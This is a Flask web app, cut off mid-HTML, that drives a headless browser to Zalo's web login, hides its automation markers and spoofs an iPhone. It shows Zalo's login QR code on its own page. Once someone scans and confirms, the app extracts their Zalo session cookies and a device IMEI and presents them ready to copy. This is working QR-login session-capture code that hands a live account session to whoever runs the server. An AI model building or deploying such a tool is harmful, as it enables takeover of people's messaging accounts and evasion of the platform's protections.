import os
import io
import json
import time
import uuid
import asyncio
import threading
import random
import string
import subprocess
import sys

from flask import Flask, request, jsonify, render_template_string, Response

QR_TTL = 600
DATA_DIR = "/tmp/qr_sessions"
os.makedirs(DATA_DIR, exist_ok=True)


def sess_path(sid):
    return os.path.join(DATA_DIR, sid + ".json")


def sess_save(sid, data):
    try:
        with open(sess_path(sid), "w", encoding="utf-8") as f:
            json.dump(data, f)
    except Exception as e:
        print("[SESS] save error: " + str(e))


def sess_load(sid):
    try:
        with open(sess_path(sid), "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None


def sess_exists(sid):
    return os.path.exists(sess_path(sid))


def gen_imei():
    return "".join(random.choices(string.digits, k=15))


app = Flask(__name__)


# ============================================================
# ZALO QR CORE — CHUẨN APP_2 & ĐỊNH DANH IPHONE 18 PRO MAX (iOS 26.1)
# ============================================================
class ZaloQR:
    def __init__(self):
        self.browser = None
        self.playwright = None

    async def start(self):
        from playwright.async_api import async_playwright
        self.playwright = await async_playwright().start()

        launch_args = [
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-dev-shm-usage",
            "--disable-gpu",
            "--single-process",
            "--no-zygote",
            "--disable-blink-features=AutomationControlled",
            "--window-size=600,900",
        ]

        try:
            self.browser = await self.playwright.chromium.launch(
                headless=True,
                args=launch_args,
            )
        except Exception:
            subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=False)
            self.browser = await self.playwright.chromium.launch(
                headless=True,
                args=launch_args,
            )

    async def _capture_qr(self, page):
        """Chờ đúng lúc mã QR render xong và chụp riêng phần QR (ảnh nhẹ 30KB, load cực nhanh)."""
        qr_target = None
        # Quét kiểm tra liên tục mỗi 0.3s xem mã QR đã xuất hiện chưa
        for _ in range(35):
            for sel in [".qrcode canvas", ".qrcode img", ".qr-wrapper img", ".qrcode", "canvas"]:
                try:
                    el = await page.query_selector(sel)
                    if el:
                        box = await el.bounding_box()
                        if box and box["width"] >= 100 and box["height"] >= 100:
                            qr_target = el
                            break
                except Exception:
                    pass
            if qr_target:
                break
            await asyncio.sleep(0.3)

        if qr_target:
            try:
                png = await qr_target.screenshot()
                print("[QR] Chup rieng ma QR thanh cong - " + str(len(png)) + " bytes")
                return png
            except Exception:
                pass

        # Fallback chụp toàn trang nếu không tách được phần tử riêng
        try:
            full_png = await page.screenshot(full_page=False)
            print("[QR] Chup full page - " + str(len(full_png)) + " bytes")
            return full_png
        except Exception as e:
            print("[QR] Loi chup: " + str(e))
            return None

    async def create_qr(self, session_id):
        try:
            await self.start()

            # Thiết lập định danh chuẩn iPhone 18 Pro Max trên iOS 26.1
            ctx = await self.browser.new_context(
                viewport={"width": 393, "height": 852},
                device_scale_factor=1.5,  # 1.5 giúp ảnh siêu nét nhưng dung lượng cực nhẹ (chỉ ~30KB)
                is_mobile=True,
                has_touch=True,
                user_agent=(
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_1 like Mac OS X) "
                    "AppleWebKit/605.1.15 (KHTML, like Gecko) "
                    "Version/26.1 Mobile/15E148 Safari/604.1"
                ),
                locale="vi-VN",
                timezone_id="Asia/Ho_Chi_Minh",
            )
            page = await ctx.new_page()

            await page.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                Object.defineProperty(navigator, 'platform', { get: () => 'iPhone' });
                Object.defineProperty(navigator, 'vendor', { get: () => 'Apple Computer, Inc.' });
                window.chrome = { runtime: {} };
            """)

            print("[QR] Mo chat.zalo.me (iPhone 18 Pro Max iOS 26.1)...")
            try:
                await page.goto("https://chat.zalo.me/", wait_until="domcontentloaded", timeout=35000)
            except Exception as e:
                if "ERR_ABORTED" not in str(e):
                    raise e

            # Bấm tab Quét mã QR nếu Zalo mặc định sang tab số điện thoại
            try:
                btn = await page.wait_for_selector("text=/QR|Quét mã/i", timeout=7000)
                if btn:
                    await btn.click()
                    print("[QR] Da click tab QR")
            except Exception:
                pass

            png = await self._capture_qr(page)
            if not png:
                raise Exception("Không thể chụp được ảnh mã QR")

            png_path = os.path.join(DATA_DIR, session_id + ".png")
            with open(png_path, "wb") as f:
                f.write(png)

            sess_save(session_id, {
                "status": "waiting",
                "created_at": time.time(),
                "png_path": png_path,
                "cookies": None,
                "compact_cookie": None,
                "imei": None,
                "device_name": "iPhone 18 Pro Max (iOS 26.1)",
                "qr_version": int(time.time()),
            })

            print("[QR] Session " + session_id + " ready")

            ACTIVE_PAGES[session_id] = {
                "page": page,
                "browser": self.browser,
                "playwright": self.playwright,
            }

            threading.Thread(
                target=lambda: asyncio.run(self._poll(page, session_id)),
                daemon=True,
            ).start()

        except Exception as e:
            print("[QR] create_qr error: " + str(e))
            sess_save(session_id, {
                "status": "error",
                "error": str(e),
                "created_at": time.time(),
            })

    async def _poll(self, page, session_id):
        start = time.time()

        # Quét cookie mỗi 1 giây để tự động chuyển trang khi người dùng xác nhận
        while time.time() - start < QR_TTL:
            try:
                cookies = await page.context.cookies()
                ck_dict = {c["name"]: c["value"] for c in cookies if "zalo" in c.get("domain", "")}

                if ck_dict.get("zpw_sek"):
                    print("[QR] PHAT HIEN ZPW_SEK -> TỰ ĐỘNG CHUYỂN TRANG LẤY COOKIE")
                    await asyncio.sleep(1.2)
                    return await self._extract(session_id, page)

                url = page.url
                if "chat.zalo.me" in url and "/login" not in url and "qr" not in url.lower():
                    print("[QR] URL doi: " + url)
                    await asyncio.sleep(1.2)
                    return await self._extract(session_id, page)

            except Exception as e:
                print("[QR] Poll error: " + str(e))

            await asyncio.sleep(1.0)

        data = sess_load(session_id) or {}
        data["status"] = "expired"
        sess_save(session_id, data)
        await self._cleanup(session_id)

    async def _extract(self, session_id, page):
        try:
            await asyncio.sleep(1.2)

            cookies = await page.context.cookies()
            ck = {c["name"]: c["value"] for c in cookies if "zalo" in c.get("domain", "")}

            # Nén chuỗi Cookie thu gọn tiêu chuẩn name=value;
            compact_cookie = "; ".join([f"{k}={v}" for k, v in ck.items()])

            imei = ""
            for k in ["imei", "zpw_imei", "device_id", "deviceId"]:
                try:
                    v = await page.evaluate("localStorage.getItem('" + k + "')")
                    if v:
                        imei = v
                        break
                except Exception:
                    pass

            if not imei and ck.get("zpw_imei"):
                imei = ck["zpw_imei"]

            if not imei:
                imei = gen_imei()

            data = sess_load(session_id) or {}
            data["status"] = "done"
            data["cookies"] = ck
            data["compact_cookie"] = compact_cookie
            data["imei"] = imei
            data["device_name"] = "iPhone 18 Pro Max (iOS 26.1)"
            sess_save(session_id, data)

            print("[QR] DANG NHAP THANH CONG - IMEI: " + imei)
            await self._cleanup(session_id)
        except Exception as e:
            print("[QR] Extract error: " + str(e))
            data = sess_load(session_id) or {}
            data["status"] = "error"
            data["error"] = str(e)
            sess_save(session_id, data)

    async def _cleanup(self, session_id):
        info = ACTIVE_PAGES.pop(session_id, None)
        if info:
            try:
                if info.get("browser"):
                    await info["browser"].close()
                if info.get("playwright"):
                    await info["playwright"].stop()
            except Exception:
                pass


ACTIVE_PAGES = {}


# ============================================================
# API
# ============================================================
@app.route("/api/qr/create", methods=["POST"])
def api_qr_create():
    session_id = uuid.uuid4().hex[:16]

    sess_save(session_id, {
        "status": "creating",
        "created_at": time.time(),
        "png_path": None,
        "cookies": None,
        "compact_cookie": None,
        "imei": None,
        "device_name": "iPhone 18 Pro Max (iOS 26.1)",
        "qr_version": 0,
    })

    def run():
        qr = ZaloQR()
        asyncio.run(qr.create_qr(session_id))

    threading.Thread(target=run, daemon=True).start()

    # Chờ file ảnh được lưu xong để chuyển trang là có ảnh ngay
    start = time.time()
    while time.time() - start < 45:
        data = sess_load(session_id)
        if data and data["status"] in ("waiting", "error"):
            break
        time.sleep(0.25)

    return jsonify({
        "ok": True,
        "session_id": session_id,
        "qr_url": "/qr/" + session_id,
        "ttl": QR_TTL,
    })


@app.route("/api/qr/status/<session_id>", methods=["GET"])
def api_qr_status(session_id):
    data = sess_load(session_id)
    if not data:
        return jsonify({"error": "Session không tồn tại"}), 404
    return jsonify({
        "status": data.get("status", "waiting"),
        "imei": data.get("imei"),
        "cookies": data.get("cookies"),
        "compact_cookie": data.get("compact_cookie"),
        "device_name": data.get("device_name", "iPhone 18 Pro Max (iOS 26.1)"),
        "error": data.get("error"),
        "qr_version": data.get("qr_version", 0),
    })


@app.route("/api/qr/force-extract/<session_id>", methods=["POST"])
def api_qr_force_extract(session_id):
    data = sess_load(session_id)
    if not data:
        return jsonify({"error": "Session không tồn tại"}), 404

    if data.get("status") == "done" and data.get("compact_cookie"):
        return jsonify({
            "status": "done",
            "imei": data.get("imei"),
            "compact_cookie": data.get("compact_cookie"),
        })

    info = ACTIVE_PAGES.get(session_id)
    if not info:
        return jsonify({
            "status": data.get("status", "waiting"),
            "imei": data.get("imei"),
            "cookies": data.get("cookies"),
            "compact_cookie": data.get("compact_cookie"),
            "note": "Session đã đóng",
        })

    try:
        async def _read():
            page = info["page"]
            cookies = await page.context.cookies()
            ck = {c["name"]: c["value"] for c in cookies if "zalo" in c.get("domain", "")}
            compact_cookie = "; ".join([f"{k}={v}" for k, v in ck.items()])

            imei = ""
            for k in ["imei", "zpw_imei", "device_id", "deviceId"]:
                try:
                    v = await page.evaluate("localStorage.getItem('" + k + "')")
                    if v:
                        imei = v
                        break
                except Exception:
                    pass
            return ck, compact_cookie, imei

        result = {}
        t = threading.Thread(target=lambda: result.update({"data": asyncio.run(_read())}))
        t.start()
        t.join(timeout=8)

        if "data" not in result:
            return jsonify({"status": "waiting", "note": "Timeout"})

        ck, compact_cookie, imei = result["data"]

        if ck.get("zpw_sek"):
            if not imei:
                imei = gen_imei()
            data["status"] = "done"
            data["cookies"] = ck
            data["compact_cookie"] = compact_cookie
            data["imei"] = imei
            sess_save(session_id, data)
            return jsonify({
                "status": "done",
                "imei": imei,
                "compact_cookie": compact_cookie,
            })

        return jsonify({
            "status": "waiting",
            "note": "Chưa có zpw_sek",
            "cookies_count": len(ck),
        })

    except Exception as e:
        return jsonify({"status": "waiting", "error": str(e)})


@app.route("/api/qr/refresh/<session_id>", methods=["POST"])
def api_qr_refresh(session_id):
    info = ACTIVE_PAGES.get(session_id)
    if not info:
        return jsonify({"error": "Session đã đóng"}), 404

    try:
        async def _refresh():
            page = info["page"]
            await asyncio.sleep(0.5)
            # Ưu tiên chụp phần tử QR code
            for sel in [".qrcode canvas", ".qrcode img", "canvas", ".qrcode"]:
                try:
                    el = await page.query_selector(sel)
                    if el:
                        box = await el.bounding_box()
                        if box and box["width"] >= 100:
                            return await el.screenshot()
                except Exception:
                    pass
            return await page.screenshot(full_page=False)

        result = {}
        t = threading.Thread(target=lambda: result.update({"png": asyncio.run(_refresh())}))
        t.start()
        t.join(timeout=10)

        if "png" not in result or not result["png"]:
            return jsonify({"error": "Không chụp được"}), 500

        png_path = os.path.join(DATA_DIR, session_id + ".png")
        with open(png_path, "wb") as f:
            f.write(result["png"])

        data = sess_load(session_id) or {}
        data["qr_version"] = int(time.time())
        sess_save(session_id, data)

        return jsonify({"ok": True, "qr_version": data["qr_version"]})

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/qr-image/<session_id>")
def qr_image(session_id):
    data = sess_load(session_id)
    if not data:
        return "Not found", 404
    png_path = data.get("png_path")
    if not png_path or not os.path.exists(png_path):
        return "Đang tạo QR...", 404
    with open(png_path, "rb") as f:
        content = f.read()
    return Response(
        content,
        mimetype="image/png",
        headers={
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "Expires": "0",
        }
    )


@app.route("/")
def home():
    return render_template_string(HTML_HOME)


@app.route("/qr/<session_id>")
def page_qr(session_id):
    if not sess_exists(session_id):
        return render_template_string(HTML_EXPIRED), 404
    data = sess_load(session_id) or {}
    qr_version = data.get("qr_version", int(time.time()))
    return render_template_string(HTML_QR, session_id=session_id, qr_version=qr_version)


# ============================================================
# LIQUID GLASS UI — MÃ QR TO 340PX & NÚT BẤM VIÊN THUỐC TRẮNG TUYẾT
# ============================================================
SHARED_CSS = """
* { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
html { -webkit-text-size-adjust:100%; touch-action:manipulation; }
body {
    font-family:-apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Inter', 'Segoe UI', Roboto, sans-serif;
    min-height:100vh; min-height:100dvh;
    display:flex; align-items:center; justify-content:center;
    background:
        radial-gradient(circle at 15% 15%, rgba(0, 255, 200, 0.4), transparent 45%),
        radial-gradient(circle at 85% 85%, rgba(0, 180, 255, 0.4), transparent 45%),
        radial-gradient(circle at 50% 50%, rgba(10, 25, 35, 0.85), #03141a);
    background-size:180% 180%;
    animation:liquidShift 16s ease-in-out infinite alternate;
    padding:16px;
    color:#ffffff;
}
@keyframes liquidShift {
    0% { background-position:0% 0%; }
    100% { background-position:100% 100%; }
}

.card {
    position:relative;
    background:rgba(255, 255, 255, 0.1);
    backdrop-filter:blur(36px) saturate(210%);
    -webkit-backdrop-filter:blur(36px) saturate(210%);
    padding:36px 24px 32px;
    border-radius:36px;
    border:1.5px solid rgba(255, 255, 255, 0.35);
    box-shadow:
        0 35px 90px rgba(0, 40, 60, 0.6),
        inset 0 1px 1px rgba(255, 255, 255, 0.8),
        inset 0 -1px 2px rgba(0, 255, 200, 0.25);
    text-align:center; max-width:480px; width:100%;
    animation:cardIn 0.35s cubic-bezier(0.16,1,0.3,1);
    overflow:hidden;
}
.card::before {
    content:'';
    position:absolute; top:-50%; left:-50%; width:200%; height:200%;
    background:linear-gradient(120deg, transparent 35%, rgba(255,255,255,0.2) 50%, transparent 65%);
    animation:shine 7s linear infinite;
    pointer-events:none;
}
@keyframes shine {
    0% { transform:translateX(-100%) rotate(18deg); }
    100% { transform:translateX(100%) rotate(18deg); }
}
@keyframes cardIn {
    from { opacity:0; transform:translateY(20px) scale(0.97); }
    to { opacity:1; transform:translateY(0) scale(1); }
}

.brand-badge {
    display:inline-flex; align-items:center; justify-content:center;
    width:62px; height:62px; border-radius:22px;
    background:linear-gradient(135deg, rgba(255,255,255,0.3), rgba(255,255,255,0.08));
    border:1px solid rgba(255,255,255,0.5);
    margin-bottom:14px;
    box-shadow:0 10px 25px rgba(0, 255, 200, 0.3), inset 0 1px 1px #ffffff;
}
.brand-badge svg { width:30px; height:30px; stroke:#ffffff; fill:none; stroke-width:2.2; }

h1 {
    color:#ffffff; margin-bottom:6px;
    font-size:22px; font-weight:900; letter-spacing:-0.4px;
    text-shadow:0 2px 16px rgba(0, 255, 200, 0.5);
}
p.sub {
    color:rgba(255, 255, 255, 0.88);
    margin-bottom:22px; font-size:13px; font-weight:500;
}

/* NÚT BẤM VIÊN THUỐC MÀU TRẮNG TUYẾT */
.btn-pill {
    position:relative; width:100%; padding:16px 24px; border-radius:9999px;
    background:linear-gradient(180deg, #ffffff 0%, #f4f8fb 100%);
    color:#003d4d; font-size:14px; font-weight:900;
    font-family:inherit; cursor:pointer; letter-spacing:0.3px;
    border:1.5px solid #ffffff;
    box-shadow:
        0 12px 28px rgba(0, 40, 50, 0.35),
        inset 0 2px 2px #ffffff,
        inset 0 -2px 4px rgba(0, 200, 255, 0.25);
    display:inline-flex; align-items:center; justify-content:center; gap:10px;
    text-decoration:none;
    transition:all 0.25s cubic-bezier(0.16,1,0.3,1);
}
.btn-pill:hover {
    background:#ffffff; transform:translateY(-2px);
    box-shadow:0 18px 40px rgba(0, 255, 200, 0.45), inset 0 2px 2px #ffffff;
}
.btn-pill:active { transform:translateY(0); }
.btn-pill:disabled { opacity:0.65; cursor:wait; }
.btn-pill svg { width:18px; height:18px; stroke:#003d4d; stroke-width:2.4; fill:none; }

.btn-secondary {
    margin-top:10px;
    background:rgba(255, 255, 255, 0.14);
    color:#ffffff;
    border:1px solid rgba(255, 255, 255, 0.35);
    box-shadow:0 6px 18px rgba(0,0,0,0.2), inset 0 1px 1px rgba(255,255,255,0.4);
}
.btn-secondary:hover {
    background:rgba(255, 255, 255, 0.25);
    box-shadow:0 10px 25px rgba(0, 255, 200, 0.3);
}
.btn-secondary svg { stroke:#ffffff; }

@keyframes spin {
    0% { transform:rotate(0deg); }
    100% { transform:rotate(360deg); }
}
.spin { animation:spin 1s linear infinite; }
"""


HTML_HOME = """<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Đăng Nhập Zalo — Liquid Glass</title>
<style>
""" + SHARED_CSS + """
.steps {
    margin-top:24px; text-align:left;
    background:rgba(255, 255, 255, 0.08);
    backdrop-filter:blur(20px);
    border:1px solid rgba(255, 255, 255, 0.2);
    padding:18px 20px; border-radius:24px;
    box-shadow:inset 0 1px 1px rgba(255,255,255,0.25);
}
.steps-title {
    display:flex; align-items:center; gap:8px;
    color:#a7ffeb; font-size:11px; font-weight:900;
    letter-spacing:1px; margin-bottom:12px; text-transform:uppercase;
}
.steps-title svg { width:14px; height:14px; stroke:#a7ffeb; fill:none; stroke-width:2.5; }
.step-item {
    display:flex; align-items:center; gap:10px;
    color:#ffffff; font-size:13px; font-weight:600;
    margin-bottom:8px; line-height:1.4;
}
.step-badge {
    flex-shrink:0; width:20px; height:20px; border-radius:50%;
    background:#ffffff; color:#003d4d; font-size:11px; font-weight:900;
    display:inline-flex; align-items:center; justify-content:center;
}
</style>
</head>
<body>
<div class="card">
    <div class="brand-badge">
        <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
            <rect x="5" y="2" width="14" height="20" rx="3"></rect>
            <line x1="12" y1="18" x2="12.01" y2="18"></line>
        </svg>
    </div>

    <h1>TẠO MÃ QR ZALO</h1>
    <p class="sub">Tạo mã QR tức thì & Định danh iPhone 18 Pro Max (iOS 26.1)</p>

    <button id="btn-start" class="btn-pill" onclick="startQR()">
        <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
            <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
        </svg>
        <span>KHỞI TẠO MÃ QR</span>
    </button>

    <div class="steps">
        <div class="steps-title">
            <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
            Quy trình tức thì
        </div>
        <div class="step-item"><span class="step-badge">1</span> Bấm Khởi tạo mã QR</div>
        <div class="step-item"><span class="step-badge">2</span> Mã QR tải to rõ chỉ trong 2-3 giây</div>
        <div class="step-item"><span class="step-badge">3</span> Mở Zalo quét mã & xác nhận iPhone 18 Pro Max</div>
        <div class="step-item"><span class="step-badge">4</span> Web tự động chuyển sang trang lấy Cookie & IMEI</div>
    </div>
</div>

<script>
async function startQR() {
    const btn = document.getElementById('btn-start');
    btn.disabled = true;
    btn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke-opacity="0.25"></circle><path d="M12 2a10 10 0 0 1 10 10"></path></svg><span>ĐANG TẢI MÃ QR...</span>';
    try {
        const r = await fetch('/api/qr/create', { method: 'POST' });
        const d = await r.json();
        if (d.ok) {
            btn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg><span>SẴN SÀNG</span>';
            setTimeout(() => { window.location.href = d.qr_url; }, 80);
        } else {
            alert('Lỗi: ' + (d.error || 'Không rõ nguyên nhân'));
            btn.disabled = false;
            btn.innerHTML = '<svg viewBox="0 0 24 24"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg><span>KHỞI TẠO MÃ QR</span>';
        }
    } catch (e) {
        alert('Lỗi kết nối: ' + e.message);
        btn.disabled = false;
        btn.innerHTML = '<svg viewBox="0 0 24 24"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg><span>KHỞI TẠO MÃ QR</span>';
    }
}
</script>
</body>
</html>
"""


HTML_QR = """<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Quét QR — Liquid Glass</title>
<style>
""" + SHARED_CSS + """
/* KHUNG HIỂN THỊ MÃ QR TO RÕ NÉT (340PX) */
.qr-container {
    position:relative;
    background:#ffffff;
    padding:16px; border-radius:28px;
    margin:0 auto 16px; max-width:340px; width:100%; min-height:340px;
    border:2.5px solid rgba(0, 255, 200, 0.7);
    box-shadow:
        0 20px 60px rgba(0, 60, 80, 0.5),
        0 0 40px rgba(0, 255, 200, 0.35);
    display:flex; align-items:center; justify-content:center;
}
.qr-container img {
    width:100%; height:auto; display:block; border-radius:18px;
    object-fit:contain;
}

.device-badge {
    display:inline-flex; align-items:center; justify-content:center; gap:6px;
    font-size:12px; color:#a7ffeb; font-weight:800; margin-bottom:14px;
    text-shadow:0 1px 8px rgba(0, 255, 200, 0.6);
}
.device-badge svg { width:15px; height:15px; stroke:#a7ffeb; fill:none; stroke-width:2.2; }

.status-badge {
    padding:11px 16px; border-radius:9999px;
    font-size:12px; font-weight:800;
    display:inline-flex; align-items:center; justify-content:center; gap:8px;
    background:rgba(255, 255, 255, 0.15);
    backdrop-filter:blur(15px);
    border:1px solid rgba(255, 255, 255, 0.3);
    color:#ffffff; margin-bottom:14px; width:100%;
}
.status-badge svg { width:15px; height:15px; stroke:currentColor; fill:none; stroke-width:2.2; }

.result-card { text-align:left; animation:cardIn 0.35s ease; }
.success-banner {
    text-align:center; padding:18px;
    background:rgba(0, 255, 200, 0.18);
    backdrop-filter:blur(24px);
    border-radius:24px; margin-bottom:14px;
    border:1.5px solid rgba(0, 255, 200, 0.5);
}
.success-badge-icon {
    width:44px; height:44px; border-radius:50%; margin:0 auto 8px;
    background:#ffffff; display:flex; align-items:center; justify-content:center;
    box-shadow:0 6px 20px rgba(0,255,200,0.5);
}
.success-badge-icon svg { width:22px; height:22px; stroke:#003d4d; stroke-width:2.6; fill:none; }
.success-title { font-size:16px; font-weight:900; color:#ffffff; text-shadow:0 2px 10px rgba(0,255,200,0.6); }

.data-box {
    padding:12px 16px; border-radius:18px;
    background:rgba(255, 255, 255, 0.1);
    backdrop-filter:blur(16px);
    margin-bottom:10px;
    border:1px solid rgba(255, 255, 255, 0.22);
}
.data-label {
    display:flex; align-items:center; justify-content:space-between;
    font-size:10px; color:#a7ffeb; text-transform:uppercase;
    font-weight:900; letter-spacing:1px; margin-bottom:6px;
}
.data-label-left { display:flex; align-items:center; gap:6px; }
.data-label-left svg { width:13px; height:13px; stroke:#a7ffeb; fill:none; stroke-width:2; }
.btn-toggle {
    background:transparent; border:none; color:#ffffff; font-size:10px;
    cursor:pointer; text-decoration:underline; font-weight:700;
}
.data-val {
    font-family:ui-monospace, SFMono-Regular, Menlo, monospace; font-size:11px; color:#ffffff;
    word-break:break-all; font-weight:600; line-height:1.45;
}
.data-val.compact {
    display:-webkit-box; -webkit-line-clamp:2; -webkit-box-orient:vertical; overflow:hidden;
}

.toast {
    position:fixed; bottom:24px; left:50%; transform:translateX(-50%);
    background:#ffffff; color:#003d4d;
    padding:12px 24px; border-radius:9999px;
    font-weight:900; font-size:13px; z-index:9999;
    border:1.5px solid #ffffff;
    box-shadow:0 15px 40px rgba(0,0,0,0.4), 0 0 25px rgba(0,255,200,0.6);
    display:flex; align-items:center; gap:8px;
}
.toast svg { width:16px; height:16px; stroke:#003d4d; stroke-width:2.6; fill:none; }
</style>
</head>
<body>
<div class="card">
    <div class="brand-badge">
        <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
            <rect x="5" y="2" width="14" height="20" rx="3"></rect>
            <line x1="12" y1="18" x2="12.01" y2="18"></line>
        </svg>
    </div>

    <h1>QUÉT QR ZALO</h1>
    <p class="sub">Mở app Zalo trên điện thoại để quét mã</p>

    <div id="qr-block">
        <div class="qr-container">
            <img id="qr-img" src="/qr-image/{{ session_id }}?v={{ qr_version }}" alt="Mã QR">
        </div>
        <div class="device-badge">
            <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
            <span>Thiết bị đăng nhập mục tiêu: iPhone 18 Pro Max (iOS 26.1)</span>
        </div>
    </div>

    <div id="status" class="status-badge">
        <svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke-opacity="0.25"></circle><path d="M12 2a10 10 0 0 1 10 10"></path></svg>
        <span>Đang chờ quét và xác nhận...</span>
    </div>

    <button id="btn-refresh" class="btn-pill btn-secondary" onclick="refreshQR()">
        <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
            <polyline points="23 4 23 10 17 10"></polyline>
            <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path>
        </svg>
        <span>LÀM MỚI MÃ QR</span>
    </button>

    <button id="btn-force" class="btn-pill btn-secondary" onclick="forceCheck()">
        <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
            <polyline points="22 4 12 14.01 9 11.01"></polyline>
        </svg>
        <span>TÔI ĐÃ ĐỒNG Ý - LẤY COOKIE</span>
    </button>
</div>

<script>
const sessionId = "{{ session_id }}";
let done = false;
let isCookieExpanded = false;
let lastQrVersion = {{ qr_version }};

// Tự động kiểm tra trạng thái mỗi 1 giây để tự động chuyển trang khi bạn bấm Đồng ý
async function check() {
    if (done) return;
    try {
        const r = await fetch('/api/qr/status/' + sessionId);
        const d = await r.json();

        if (d.qr_version && d.qr_version > lastQrVersion) {
            lastQrVersion = d.qr_version;
            document.getElementById('qr-img').src = '/qr-image/' + sessionId + '?v=' + d.qr_version;
        }

        if (d.status === 'done') {
            done = true;
            showResult(d);
        } else if (d.status === 'error') {
            document.getElementById('status').innerHTML = '<span>❌ ' + (d.error || 'Lỗi') + '</span>';
            done = true;
        } else if (d.status === 'expired') {
            document.getElementById('status').innerHTML = '<span>⏰ QR hết hạn</span>';
            done = true;
        }
    } catch (e) {}
}

async function refreshQR() {
    const btn = document.getElementById('btn-refresh');
    btn.disabled = true;
    btn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke-opacity="0.25"></circle><path d="M12 2a10 10 0 0 1 10 10"></path></svg><span>ĐANG LẤY QR MỚI...</span>';
    try {
        const r = await fetch('/api/qr/refresh/' + sessionId, { method: 'POST' });
        const d = await r.json();
        if (d.ok) {
            lastQrVersion = d.qr_version;
            document.getElementById('qr-img').src = '/qr-image/' + sessionId + '?v=' + d.qr_version;
            showToast('Đã làm mới mã QR');
        }
    } catch (e) {}
    btn.disabled = false;
    btn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"></polyline><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path></svg><span>LÀM MỚI MÃ QR</span>';
}

async function forceCheck() {
    const btn = document.getElementById('btn-force');
    btn.disabled = true;
    btn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke-opacity="0.25"></circle><path d="M12 2a10 10 0 0 1 10 10"></path></svg><span>ĐANG KIỂM TRA...</span>';
    try {
        const r = await fetch('/api/qr/force-extract/' + sessionId, { method: 'POST' });
        const d = await r.json();
        if (d.status === 'done') {
            done = true;
            showResult(d);
        } else {
            alert('Chưa có cookie. Đợi 5-10 giây rồi thử lại.\\n' + (d.note || ''));
            btn.disabled = false;
            btn.innerHTML = '<svg viewBox="0 0 24 24"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg><span>TÔI ĐÃ ĐỒNG Ý - LẤY COOKIE</span>';
        }
    } catch (e) {
        alert('Lỗi: ' + e.message);
        btn.disabled = false;
        btn.innerHTML = '<svg viewBox="0 0 24 24"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg><span>TÔI ĐÃ ĐỒNG Ý - LẤY COOKIE</span>';
    }
}

function showResult(d) {
    const imei = d.imei || '000000000000000';
    const compactCookie = d.compact_cookie || '';
    const combo = imei + '|' + compactCookie;

    document.getElementById('qr-block').style.display = 'none';
    document.getElementById('btn-refresh').style.display = 'none';
    document.getElementById('btn-force').style.display = 'none';
    document.getElementById('status').style.display = 'none';

    const card = document.querySelector('.card');
    const resWrap = document.createElement('div');
    resWrap.className = 'result-card';
    resWrap.innerHTML =
        '<div class="success-banner">' +
            '<div class="success-badge-icon">' +
                '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>' +
            '</div>' +
            '<div class="success-title">ĐĂNG NHẬP THÀNH CÔNG!</div>' +
        '</div>' +
        '<div class="data-box">' +
            '<div class="data-label">' +
                '<div class="data-label-left">' +
                    '<svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="3"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>' +
                    'Định Danh IMEI (iPhone 18 Pro Max — iOS 26.1)' +
                '</div>' +
            '</div>' +
            '<div class="data-val">' + imei + '</div>' +
        '</div>' +
        '<div class="data-box">' +
            '<div class="data-label">' +
                '<div class="data-label-left">' +
                    '<svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>' +
                    'Cookie (Thu Gọn)' +
                '</div>' +
                '<button class="btn-toggle" id="toggle-ck" onclick="toggleCookie()">Mở rộng</button>' +
            '</div>' +
            '<div class="data-val compact" id="cookie-val">' + compactCookie + '</div>' +
        '</div>' +
        '<button class="btn-pill" id="copy-all" style="margin-top:14px;">' +
